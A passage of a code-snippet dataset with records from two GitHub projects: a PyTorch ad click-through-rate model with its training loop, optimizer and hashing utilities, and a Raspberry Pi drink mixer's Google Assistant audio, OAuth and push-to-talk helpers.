clip_grad_norm(model.parameters(),max_norm=5)\n\n            # update weights\n            optimizer.step()\n\n            # evaluate metrics\n            detail_meters[\"loss\"].update(loss.data[0])\n            detail_meters[\"epoch_loss\"].update(loss.data[0])\n            detail_meters[\"model_loss\"].update(model_loss.data[0])\n            detail_meters[\"epoch_model_loss\"].update(model_loss.data[0])\n            tp,fp,fn,tn,scores = evaluate(output.data,samples[\"labels\"].data,samples[\"label_weights\"].data)\n            #print(tp,fn,fp,tn)\n            detail_meters[\"tp\"].update(tp)\n            detail_meters[\"fp\"].update(fp)\n            detail_meters[\"fn\"].update(fn)\n            detail_meters[\"tn\"].update(tn)\n            # the large the better\n            tp_rate = detail_meters[\"tp\"].sum / (detail_meters[\"tp\"].sum + detail_meters[\"fn\"].sum + 1e-20)\n            # the smaller the better\n            fp_rate = detail_meters[\"fp\"].sum / (detail_meters[\"fp\"].sum + detail_meters[\"tn\"].sum + 1e-20)\n            detail_meters[\"batch_time\"].update(time.time()-batch_time_s)\n\n            # collect results\n            uids = samples[\"uids\"]\n            aids = samples[\"aids\"]\n            preds = zip(aids, uids, scores)\n            gts = zip(aids,uids,samples[\"labels\"].cpu().data)\n            detail_meters[\"auc\"].update(preds,gts)\n\n            batch_time_s = time.time()\n\n            # log results\n            if (batch_idx+1) % cfg[\"train\"][\"logging_freq\"]==0:\n                logging.info(\"Train Batch [{cur_batch}/{ed_batch}] \"\n                             \"loss: {loss} \"\n                             \"model_loss: {model_loss} \"\n                             \"auc: {auc} \"\n                             \"tp: {tp} fn: {fn} fp: {fp} tn: {tn} \"\n                             \"tp_rate: {tp_rate} fp_rate: {fp_rate} \"\n                             \"io time: {io_time}s batch time {batch_time}s\".format(\n                    cur_batch=batch_idx+1,\n                    ed_batch=n_batch,\n                    loss = detail_meters[\"loss\"].mean,\n                    model_loss = detail_meters[\"model_loss\"].mean,\n                    tp=detail_meters[\"tp\"].sum,\n                    fn=detail_meters[\"fn\"].sum,\n                    fp=detail_meters[\"fp\"].sum,\n                    tn=detail_meters[\"tn\"].sum,\n                    auc = detail_meters[\"auc\"].auc,\n                    tp_rate=tp_rate,\n                    fp_rate=fp_rate,\n                    io_time = detail_meters[\"io_time\"].mean,\n                    batch_time = detail_meters[\"batch_time\"].mean,\n                )\n                )\n                detail_meters[\"auc\"].reset()\n\n            if total_n_batch % cfg[\"train\"][\"backup_freq_batch\"] == 0 and total_n_batch >= cfg[\"train\"][\"start_backup_batch\"]:\n                state_to_save = {\n                    \"cur_epoch\": cur_epoch,\n                    \"model_state\": model.state_dict(),\n                    \"optimizer_state\": optimizer.state_dict(),\n                }\n                checkpoint_file = os.path.join(cfg[\"output_path\"], \"epoch_{}_tbatch_{}.checkpoint\".format(cur_epoch,total_n_batch))\n                save_checkpoint(state_to_save, checkpoint_file)\n                logging.info(\"Save checkpoint to {}.\".format(checkpoint_file))\n\n            if total_n_batch%cfg[\"train\"][\"valid_freq_batch\"] == 0 and total_n_batch>=cfg[\"train\"][\"start_valid_batch\"]:\n                valid(cur_epoch)\n                model.train()\n                logging.info(\"Set network to train model.\")\n\n\n    logging.info(\"Train Epoch [{cur_epoch}] \"\n                 \"loss: {loss} \"\n                 \"model_loss: {model_loss} \".format(\n        cur_epoch=cur_epoch,\n        loss=detail_meters[\"epoch_loss\"].mean,\n        model_loss=detail_meters[\"epoch_model_loss\"].mean,\n    )\n    )\n\n    # back up\n    if cur_epoch % cfg[\"train\"][\"backup_freq_epoch\"]==0 and cur_epoch>=cfg[\"train\"][\"start_backup_epoch\"]:\n        state_to_save = {\n            \"cur_epoch\": cur_epoch,\n            \"model_state\": model.state_dict(),\n            \"optimizer_state\": optimizer.state_dict(),\n        }\n        checkpoint_file = os.path.join(cfg[\"output_path\"],\"epoch_{}.checkpoint\".format(cur_epoch))\n        save_checkpoint(state_to_save,checkpoint_file)\n        logging.info(\"Save checkpoint to {}.\".format(checkpoint_file))\n\n    # valid on valid dataset\n    if cur_epoch % cfg[\"train\"][\"valid_freq_epoch\"]==0 and cur_epoch>=cfg[\"train\"][\"start_valid_epoch\"]:\n        valid(cur_epoch)\n        model.train()\n        logging.info(\"Set network to train model.\")", "path": "src\\train_model_din_by_epoch_chunked_r.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "# features in sparse representation (feature values, offsets for each sample, ...), see Embedding class in pytorch.\n", "func_signal": "def forward(self, samples):\n", "code": "embedding_features_s = samples[\"embedding_features\"]\n\n# obtain reference vector for attention, here it is the embedding of aid.\nad_ref = self.embed({\"aid\": embedding_features_s[\"aid\"]}, None)[\"aid\"]\n\nembedding_features_d = self.embed(embedding_features_s, ad_ref)\n\nembedding_features = torch.cat(list(embedding_features_d.values()), dim=1)\n\nB, L = embedding_features.size()\n\nz = embedding_features\n\n# FFM\nr = self.fm(z.view(B, self.n_feat*self.n_field, self.n_embed_dim//self.n_field))\n#r = self.w_fm(r)\n\nx = torch.cat([embedding_features,r],dim=1)\nx = self.bn0(x)\nd = self.linear1(x)\nd = self.dice1(d)\n# d = self.bn1(d)\n# d = self.relu(d)\nd = self.linear2(d)\nd = self.dice2(d)\n# d = self.bn2(d)\n# d = self.relu(d)\ns = self.linear3(d)\n\n# d = self.tanh(d)\n# f1 = self.tanh(f1)\n# r = self.tanh(r)\n\n# s = torch.sum(r,dim=1)+d.view(-1)\n# s = d + f1 + r\n# print(d[:10],f1[:10],r[:10])\ns = s.view(-1)\n\ntarget = samples[\"labels\"]\ntarget_weight = samples[\"label_weights\"]\nif target is None:\n    return None, s, None, None, d\nl = self.loss(s,target,target_weight,size_average=False)\n\n\n# average loss manually\nmodel_loss = l / samples[\"size\"]\n\nfinal_loss = model_loss\n\nreturn final_loss, s, model_loss, 0, d", "path": "src\\model\\DIN_ffm_v3_r.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "'''\n\n:param input:  a 1-dim tensor of indices\n:param offset: a 1-dim tensor of offsets\n:param ref: a 2-dim tensor of ref feats, typically the features of ads\n:return:\n'''\n", "func_signal": "def forward(self, input, offsets, ref=None):\n", "code": "assert (ref is None and not self.atten) or (ref is not None and self.atten)\n# add 1 dim for Embedding\ninput = input.view(1,-1)\n# return 1, n_word, n_dim\nembedding = self.embedder(input)\n#print(embedding)\nsize = embedding.size()\n# n_word, n_dim\nembedding = embedding.view(size[1],size[2])\nif self.atten:\n    size = embedding.size()\n    # replicate ref n_word, n_dim\n    ref = replicate(ref,offsets,size[0])\n    #print(ref)\n    # calculate the attention\n    #todo\n    diff = ref-embedding\n    feat_for_atten = torch.cat([embedding,diff,ref],dim=1)\n    atten = self.linear1(feat_for_atten)\n    atten = self.activation(atten)\n    atten = self.linear2(atten)\n    # n_word, 1\n    atten = self.sigmoid(atten)\n    # print(atten)\n    embedding = embedding * atten\n    #print(embedding)\n# n_sample, n_dim\nres = reduce(embedding,offsets,self.mode)\n# following lines constrain the max norm of embedding.\nsize = res.size()\n# n_sample, n_field, n_dim//n_field\nres = res.view(size[0]*self.n_field,size[1]//self.n_field)\nrenorm_res = torch.renorm(res,p=self.norm_type,dim=0,maxnorm=self.max_norm)\nrenorm_res = renorm_res.contiguous()\n# res = F.normalize(res,p=self.norm_type,dim=2)*self.max_norm\nres = renorm_res.view(size[0],size[1])\nreturn res", "path": "src\\module\\embedding_atten_v2.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"Returns the state of the optimizer as a :class:`dict`.\n\nIt contains two entries:\n\n* state - a dict holding current optimization state. Its content\n    differs between optimizer classes.\n* param_groups - a dict containing all parameter groups\n\"\"\"\n# Save ids instead of Variables\n", "func_signal": "def state_dict(self):\n", "code": "def pack_group(group):\n    packed = {k: v for k, v in group.items() if k != 'params'}\n    packed['params'] = [id(p) for p in group['params']]\n    return packed\nparam_groups = [pack_group(g) for g in self.param_groups]\n# Remap state to use ids as keys\npacked_state = {(id(k) if isinstance(k, Variable) else k): v\n                for k, v in self.state.items()}\nreturn {\n    'state': packed_state,\n    'param_groups': param_groups,\n}", "path": "src\\optimizer\\optimizer.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "'''\n\n:param ctx:\n:param input:\n:param offsets:\n:return: output: has the same size as input\n'''\n", "func_signal": "def forward(ctx, input, offsets):\n", "code": "output = torch.zeros_like(input)\ninput = input.contiguous()\noffsets = offsets\nif not input.is_cuda:\n    my_lib.softmax_forward(input, offsets.contiguous(), output)\nelse:\n    my_lib.softmax_forward_cuda(input, offsets.contiguous(), output)\nctx.save_for_backward(offsets,output)\nreturn output", "path": "src\\clib_dev\\functions\\tools.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"\nReturns: The FNV-1a (alternate) hash of a given string\n\"\"\"\n# Constants\n", "func_signal": "def fnv1a_64(string, seed=0):\n", "code": "FNV_prime = 1099511628211\noffset_basis = 14695981039346656037\n\n# FNV-1a Hash Function\nhash = offset_basis + seed\nfor char in string:\n    hash = hash ^ ord(char)\n    hash = hash * FNV_prime\nreturn hash", "path": "src\\lib\\hash.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"Add a param group to the :class:`Optimizer` s `param_groups`.\n\nThis can be useful when fine tuning a pre-trained network as frozen layers can be made\ntrainable and added to the :class:`Optimizer` as training progresses.\n\nArguments:\n    param_group (dict): Specifies what Variables should be optimized along with group\n    specific optimization options.\n\"\"\"\n", "func_signal": "def add_param_group(self, param_group):\n", "code": "assert isinstance(param_group, dict), \"param group must be a dict\"\n\nparams = param_group['params']\nif isinstance(params, Variable):\n    param_group['params'] = [params]\nelse:\n    param_group['params'] = list(params)\n\nfor param in param_group['params']:\n    if not isinstance(param, Variable):\n        raise TypeError(\"optimizer can only optimize Variables, \"\n                        \"but one of the params is \" + torch.typename(param))\n    if not param.requires_grad:\n        raise ValueError(\"optimizing a parameter that doesn't require gradients\")\n    if not param.is_leaf:\n        raise ValueError(\"can't optimize a non-leaf Variable\")\n\nfor name, default in self.defaults.items():\n    if default is required and name not in param_group:\n        raise ValueError(\"parameter group didn't specify a value of required optimization parameter \" +\n                         name)\n    else:\n        param_group.setdefault(name, default)\n\nparam_set = set()\nfor group in self.param_groups:\n    param_set.update(set(group['params']))\n\nif not param_set.isdisjoint(set(param_group['params'])):\n    raise ValueError(\"some parameters appear in more than one parameter group\")\n\nself.param_groups.append(param_group)", "path": "src\\optimizer\\optimizer.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "'''\n\n:param features_s: it should be a dict!\n:return:\n'''\n", "func_signal": "def embed(self,features_s,ref=None):\n", "code": "embeded_features = {}\nfor fname,feature in features_s.items():\n    embedder = self.get_embedder(fname)\n    # print(feature)\n    if fname in self.embedding_cfgs:\n        fconfig = self.embedding_cfgs[fname]\n    else:\n        fconfig = {\"dim\": self.n_embed_dim//self.n_field, \"atten\": False}\n    if fconfig[\"atten\"]:\n        assert ref is not None\n        embeded_feature = embedder(input=feature[0], offsets=feature[1], ref=ref)\n    else:\n        embeded_feature = embedder(input=feature[0], offsets=feature[1])\n    embeded_features[fname] = embeded_feature\nreturn embeded_features", "path": "src\\model\\DIN_ffm_v3_r.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"\nReturns: The FNV-1 hash of a given string.\n\"\"\"\n# Constants\n", "func_signal": "def fnv1_64(string, seed=0):\n", "code": "FNV_prime = 1099511628211\noffset_basis = 14695981039346656037\n\n# FNV-1a Hash Function\nhash = offset_basis + seed\nfor char in string:\n    hash = hash * FNV_prime\n    hash = hash ^ ord(char)\nreturn hash", "path": "src\\lib\\hash.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "# todo automatically generate more config option based on current config\n", "func_signal": "def auto_gen_config(config,args):\n", "code": "config[\"output_path\"] = os.path.join(config[\"root_output_path\"],config[\"data\"][\"dataset\"],config[\"model_name\"],config[\"description\"])\nos.makedirs(config[\"output_path\"], exist_ok=True)\n\ndataset_path = os.path.join(config[\"data\"][\"root_path\"],config[\"data\"][\"dataset\"])\nconfig[\"train_fp\"] = os.path.join(dataset_path,config[\"train\"][\"fn\"])\nconfig[\"valid_fp\"] = os.path.join(dataset_path,config[\"valid\"][\"fn\"])\nconfig[\"test_fp\"] = os.path.join(dataset_path,config[\"test\"][\"fn\"])\n\nconfig[\"data\"][\"user_fn\"] = os.path.join(dataset_path,config[\"data\"][\"user_fn\"])\nconfig[\"data\"][\"ad_fn\"] = os.path.join(dataset_path, config[\"data\"][\"ad_fn\"])\nconfig[\"data\"][\"user_fi_fn\"] = os.path.join(dataset_path, config[\"data\"][\"user_fi_fn\"])\nconfig[\"data\"][\"ad_fi_fn\"] = os.path.join(dataset_path, config[\"data\"][\"ad_fi_fn\"])\nif \"cross_fi_fn\" in config[\"data\"]:\n    config[\"data\"][\"cross_fi_fn\"] = os.path.join(dataset_path, config[\"data\"][\"cross_fi_fn\"])\n\nconfig[\"n_gpus\"] = len(config[\"gpu_ids\"])\nconfig[\"gpus\"] = list(range(config[\"n_gpus\"]))\n\nconfig[\"resume_fp\"] = config[\"resume_fn\"]\nconfig[\"valid_res_fp\"] = os.path.join(config[\"output_path\"],config[\"valid\"][\"res_fn\"])\nconfig[\"test_res_fp\"] = os.path.join(config[\"output_path\"], config[\"test\"][\"res_fn\"])\nif \"extracted_features_fn\" in config[\"test\"]:\n    config[\"extracted_features_fp\"] = os.path.join(config[\"output_path\"],config[\"test\"][\"extracted_features_fn\"])\nelse:\n    config[\"extracted_features_fp\"] = os.path.join(config[\"output_path\"], \"extracted_features.pkl\")\n\nif \"mini_batch\" not in config:\n    config[\"mini_batch\"] = 1\n\n# config[\"train_gbdt_fp\"] = os.path.join(dataset_path, config[\"data\"][\"gbdt_path\"], config[\"train\"][\"gbdt_fn\"])\n# config[\"valid_gbdt_fp\"] = os.path.join(dataset_path, config[\"data\"][\"gbdt_path\"], config[\"valid\"][\"gbdt_fn\"])\n# config[\"test_gbdt_fp\"] = os.path.join(dataset_path, config[\"data\"][\"gbdt_path\"], config[\"test\"][\"gbdt_fn\"])\n\nfor embed_cfg in config[\"feat\"][\"u_embed_cfg\"].values():\n    if \"atten\" not in embed_cfg:\n        embed_cfg[\"atten\"] = False\n\nfor embed_cfg in config[\"feat\"][\"a_embed_cfg\"].values():\n    if \"atten\" not in embed_cfg:\n        embed_cfg[\"atten\"] = False\n\nif \"c_embed_cfg\" in config[\"feat\"]:\n    for embed_cfg in config[\"feat\"][\"c_embed_cfg\"].values():\n        if \"atten\" not in embed_cfg:\n            embed_cfg[\"atten\"] = False\n\nconfig[\"train\"][\"p2n_radio\"] = eval(config[\"train\"][\"p2n_radio\"])\nreturn config", "path": "src\\lib\\tools.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"Clears the gradients of all optimized :class:`Variable` s.\"\"\"\n", "func_signal": "def zero_grad(self):\n", "code": "for group in self.param_groups:\n    for p in group['params']:\n        if p.grad is not None:\n            if p.grad.volatile:\n                p.grad.data.zero_()\n            else:\n                data = p.grad.data\n                p.grad = Variable(data.new().resize_as_(data).zero_())", "path": "src\\optimizer\\optimizer.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "# params_group1 = []\n# params_group2 = []\n# for name,params in self.named_parameters():\n#     if name.find(\"embedder\")!=-1:\n#         params_group1.append(params)\n#         print(\"{} are in group 1 trained with lr x0.1\".format(name))\n#     else:\n#         params_group2.append(params)\n#         print(\"{} are in group 1 trained with lr x1\".format(name))\n#\n#\n#\n# params = [\n#     {'params': params_group1, \"lr_mult\": 0.1, \"decay_mult\": 1},\n#     {'params': params_group2, \"lr_mult\": 1, \"decay_mult\": 1},\n# ]\n\n", "func_signal": "def get_train_policy(self):\n", "code": "params = [{'params': self.parameters(),\"lr_mult\": 1, \"decay_mult\": 1},]\nreturn params", "path": "src\\model\\DIN_ffm_v3_r.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "'''\n\n:param input:\n:param target: assume to be {0,1}\n:param margin:\n:param weight:\n:param size_average:\n:return:\n'''\n", "func_signal": "def hinge_loss(input,target,margin=1,weight=None,size_average=True):\n", "code": "target = 2*target-1\nl = torch.max(margin-input*target,torch.zeros_like(target))\nif weight is not None:\n    l = l * weight\nif size_average:\n    l = torch.mean(l)\nelse:\n    l = torch.sum(l)\nreturn l", "path": "src\\loss\\hinge_loss.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"\nReturns: The FNV-1 hash of a given string.\n\"\"\"\n# Constants\n", "func_signal": "def fnv1_32(string, seed=0):\n", "code": "FNV_prime = 16777619\noffset_basis = 2166136261\n\n# FNV-1a Hash Function\nhash = offset_basis + seed\nfor char in string:\n    hash = hash * FNV_prime\n    hash = hash ^ ord(char)\nreturn hash", "path": "src\\lib\\hash.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"Loads the optimizer state.\n\nArguments:\n    state_dict (dict): optimizer state. Should be an object returned\n        from a call to :meth:`state_dict`.\n\"\"\"\n# deepcopy, to be consistent with module API\n", "func_signal": "def load_state_dict(self, state_dict):\n", "code": "state_dict = deepcopy(state_dict)\n# Validate the state_dict\ngroups = self.param_groups\nsaved_groups = state_dict['param_groups']\n\nif len(groups) != len(saved_groups):\n    raise ValueError(\"loaded state dict has a different number of \"\n                     \"parameter groups\")\nparam_lens = (len(g['params']) for g in groups)\nsaved_lens = (len(g['params']) for g in saved_groups)\nif any(p_len != s_len for p_len, s_len in zip(param_lens, saved_lens)):\n    raise ValueError(\"loaded state dict contains a parameter group \"\n                     \"that doesn't match the size of optimizer's group\")\n\n# Update the state\nid_map = {old_id: p for old_id, p in\n          zip(chain(*(g['params'] for g in saved_groups)),\n              chain(*(g['params'] for g in groups)))}\nstate = defaultdict(\n    dict, {id_map.get(k, k): v for k, v in state_dict['state'].items()})\n\n# Update parameter groups, setting their 'params' value\ndef update_group(group, new_group):\n    new_group['params'] = group['params']\n    return new_group\nparam_groups = [\n    update_group(g, ng) for g, ng in zip(groups, saved_groups)]\nself.__setstate__({'state': state, 'param_groups': param_groups})", "path": "src\\optimizer\\optimizer.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "'''\nNote !!! only mapped idices are supported.\n:param idices: mapped idices\n:return:\n'''\n", "func_signal": "def get_freqs(self,idices):\n", "code": "warnings.warn(\"We should use mapped idices in get_freqs...\")\nfreqs = self.ctr[idices]\nreturn freqs", "path": "src\\data_tool\\feature.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"\nReturns: The FNV-1a (alternate) hash of a given string\n\"\"\"\n# Constants\n", "func_signal": "def fnv1a_32(string, seed=0):\n", "code": "FNV_prime = 16777619\noffset_basis = 2166136261\n\n# FNV-1a Hash Function\nhash = offset_basis + seed\nfor char in string:\n    hash = hash ^ ord(char)\n    hash = hash * FNV_prime\nreturn hash", "path": "src\\lib\\hash.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "'''\n\n:param lq: lowest frequency\n:return:\n'''\n", "func_signal": "def construct_filter(self, l_freq):\n", "code": "self.filter = set()\nfor i in range(self.ctr.size):\n    if self.ctr[i]<l_freq:\n        self.filter.add(i)\n# modify mapper and ctr\nself.ctr[self.special_val] = 0\nfor i in self.filter:\n    self.mapper[i] = self.special_val\n    self.ctr[self.special_val] += self.ctr[i]\nlogging.info(\"{} constructs its filter, {}/{} values of lower freq than {} are filterd, then mapped to special value {}\".format(self.name,len(self.filter),self.n_val,l_freq,self.special_val))", "path": "src\\data_tool\\feature.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"Performs a single optimization step.\n\nArguments:\n    closure (callable, optional): A closure that reevaluates the model\n        and returns the loss.\n\"\"\"\n", "func_signal": "def step(self, closure=None):\n", "code": "loss = None\nif closure is not None:\n    loss = closure()\n\nfor group in self.param_groups:\n    for p in group['params']:\n        if p.grad is None:\n            continue\n        grad = p.grad.data\n        if grad.is_sparse:\n            raise RuntimeError('Adam does not support sparse gradients, please consider SparseAdam instead')\n        amsgrad = group['amsgrad']\n\n        state = self.state[p]\n\n        # State initialization\n        if len(state) == 0:\n            state['step'] = 0\n            # Exponential moving average of gradient values\n            state['exp_avg'] = torch.zeros_like(p.data)\n            # Exponential moving average of squared gradient values\n            state['exp_avg_sq'] = torch.zeros_like(p.data)\n            if amsgrad:\n                # Maintains max of all exp. moving avg. of sq. grad. values\n                state['max_exp_avg_sq'] = torch.zeros_like(p.data)\n\n        exp_avg, exp_avg_sq = state['exp_avg'], state['exp_avg_sq']\n        if amsgrad:\n            max_exp_avg_sq = state['max_exp_avg_sq']\n        beta1, beta2 = group['betas']\n\n        state['step'] += 1\n\n        if group['weight_decay'] != 0:\n            grad = grad.add(group['weight_decay'], p.data)\n\n        # Decay the first and second moment running average coefficient\n        exp_avg.mul_(beta1).add_(1 - beta1, grad)\n        exp_avg_sq.mul_(beta2).addcmul_(1 - beta2, grad, grad)\n        if amsgrad:\n            # Maintains the maximum of all 2nd moment running avg. till now\n            torch.max(max_exp_avg_sq, exp_avg_sq, out=max_exp_avg_sq)\n            # Use the max. for normalizing running avg. of gradient\n            denom = max_exp_avg_sq.sqrt().add_(group['eps'])\n        else:\n            denom = exp_avg_sq.sqrt().add_(group['eps'])\n\n        bias_correction1 = 1 - beta1 ** state['step']\n        bias_correction2 = 1 - beta2 ** state['step']\n        step_size = group['lr'] * math.sqrt(bias_correction2) / bias_correction1\n\n        p.data.addcdiv_(-step_size, exp_avg, denom)\n\nreturn loss", "path": "src\\optimizer\\adam.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "\"\"\"Close the underlying stream and audio interface.\"\"\"\n", "func_signal": "def close(self):\n", "code": "if self._audio_stream:\n    self.stop()\n    self._audio_stream.close()\n    self._audio_stream = None", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\" Ctrl+C handler to cleanup \"\"\"\n\n", "func_signal": "def signal_handler(signal, frame):\n", "code": "if PUSH_TO_TALK:\n  GPIO.cleanup()\n\nfor t in threading.enumerate():\n  # print(t.name)\n  if t.name != 'MainThread':\n    t.shutdown_flag.set()\n\nprint('Goodbye!')\nsys.exit(1)", "path": "software\\rpi\\__main__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Close the underlying stream.\"\"\"\n", "func_signal": "def close(self):\n", "code": "if self._wavep:\n    self._wavep.close()\nself._fp.close()", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Load credentials from the given file.\nArgs:\n  path(str): path to the credentials file.\n  scopes: scope for the given credentials.\nReturns:\n  google.oauth2.credentials.Credentials: OAuth2 credentials.\n\"\"\"\n", "func_signal": "def load_credentials(path, scopes):\n", "code": "with open(path, 'r') as f:\n    return credentials_from_dict(json.load(f),\n                                 scopes=scopes)", "path": "software\\rpi\\auth_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Write credentials to the given file.\nArgs:\n  path(str): path to the credentials file.\n  credentials(google.oauth2.credentials.Credentials): OAuth2 credentials.\n\"\"\"\n", "func_signal": "def save_credentials(path, credentials):\n", "code": "config_path = os.path.dirname(path)\nif not os.path.isdir(config_path):\n    os.makedirs(config_path)\nwith open(path, 'w') as f:\n    json.dump(credentials_to_dict(credentials), f)", "path": "software\\rpi\\auth_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Write bytes to the sink (if currently playing).\n\nWill block until start_playback() is called.\n\"\"\"\n", "func_signal": "def write(self, buf):\n", "code": "self._start_playback.wait()\nreturn self._sink.write(buf)", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Start the underlying stream.\"\"\"\n", "func_signal": "def start(self):\n", "code": "if not self._audio_stream.active:\n    self._audio_stream.start()", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Initiate an interactive OAuth2InstalledApp flow.\n\n- If an X server is running: Run a browser based flow.\n- If not: Run a console based flow.\n\nArgs:\n  client_secrets_file: The path to the client secrets JSON file.\n  scopes: The list of scopes to request during the flow.\nReturns:\n  google.oauth2.credentials.Credentials: new OAuth2 credentials authorized\n    with the given scopes.\n\"\"\"\n", "func_signal": "def credentials_flow_interactive(client_secrets_path, scopes):\n", "code": "flow = google_auth_oauthlib.flow.InstalledAppFlow.from_client_secrets_file(\n    client_secrets_path,\n    scopes=scopes)\nif 'DISPLAY' in os.environ:\n    flow.run_local_server()\nelse:\n    flow.run_console()\nreturn flow.credentials", "path": "software\\rpi\\auth_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "# Load credentials.\n", "func_signal": "def setup_assistant():\n", "code": "    try:\n      credentials = os.path.join(\n          click.get_app_dir(common_settings.ASSISTANT_APP_NAME),\n          common_settings.ASSISTANT_CREDENTIALS_FILENAME\n      )\n      global creds\n      creds = auth_helpers.load_credentials(credentials, scopes=[common_settings.ASSISTANT_OAUTH_SCOPE, common_settings.PUBSUB_OAUTH_SCOPE])\n    except Exception as e:\n      logging.error('Error loading credentials: %s', e)\n      logging.error('Run auth_helpers to initialize new OAuth2 credentials.')\n      return -1\n# Create gRPC channel\n    grpc_channel = auth_helpers.create_grpc_channel(ASSISTANT_API_ENDPOINT, creds)\n    logging.info('Connecting to %s', ASSISTANT_API_ENDPOINT)\n# Create Google Assistant API gRPC client.\n    global assistant\n    assistant = embedded_assistant_pb2.EmbeddedAssistantStub(grpc_channel)\n    return 0", "path": "software\\rpi\\__main__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Close the underlying stream.\"\"\"\n", "func_signal": "def close(self):\n", "code": "self._wavep.close()\nself._fp.close()", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Close source and sink.\"\"\"\n", "func_signal": "def close(self):\n", "code": "self._source.close()\nself._sink.close()", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\"Stop the underlying stream.\"\"\"\n", "func_signal": "def stop(self):\n", "code": "if self._audio_stream.active:\n    self.flush()\n    self._audio_stream.stop()", "path": "software\\rpi\\audio_helpers\\__init__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
{"docstring": "\"\"\" Polling function for push-to-talk button \"\"\"\n\n", "func_signal": "def poll(assistant_thread):\n", "code": "is_active = False\n# vals = [1, 1, 1]\nvals = [0, 0, 0]\n\nwhile True:\n\n  # get input value\n  val = GPIO.input(PUSH_TO_TALK_PIN)\n  # print(\"input = \", in_val)\n\n  # shift values\n  vals[2] = vals[1]\n  vals[1] = vals[0]\n  vals[0] = val\n\n  # check for button press and hold\n  # if (is_active == False) and (vals[2] == 1) and (vals[1] == 0) and (vals[0] == 0):\n  if (is_active == False) and (vals[2] == 0) and (vals[1] == 1) and (vals[0] == 1):\n    is_active = True\n    assistant_thread.button_flag.set()\n    print('Start talking')\n\n  # check for button release\n  # if (is_active == True) and (vals[2] == 0) and (vals[1] == 1) and (vals[0] == 1):\n  if (is_active == True) and (vals[2] == 1) and (vals[1] == 0) and (vals[0] == 0):\n    is_active = False\n\n  # sleep\n  time.sleep(0.1)", "path": "software\\rpi\\__main__.py", "repo_name": "Deeplocal/mocktailsmixer", "stars": 391, "license": "mit", "language": "python", "size": 15958}
